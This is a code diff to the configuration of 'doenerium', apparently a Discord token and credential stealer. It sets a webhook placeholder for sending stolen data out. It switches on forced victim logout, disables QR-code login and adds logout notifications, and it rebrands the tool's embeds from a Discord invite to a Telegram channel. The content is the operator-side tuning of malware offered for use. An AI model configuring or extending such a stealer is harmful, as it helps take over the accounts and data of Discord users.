@@ -15,20 +15,20 @@ var config = {
 
     webhook: "%WEBHOOK_LINK%",
 
-    logout: false,
-    disable_qr_code: false,
+    logout: true,
+    disable_qr_code: true,
 
-    notify_on_logout: false,
+    notify_on_logout: true,
     notify_on_initialization: true,
     ping: [true, "@doener"],
 
     embed: {
-        username: "doenerium | discord.gg/kurdistan",
+        username: "doenerium | t.me/doenerium",
         footer: {
-            text: `doenerium | discord.gg/kurdistan`,
+            text: `doenerium | t.me/doenerium`,
             icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "https://discord.gg/kurdistan",
+        href: "https://t.me/doenerium",
         avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
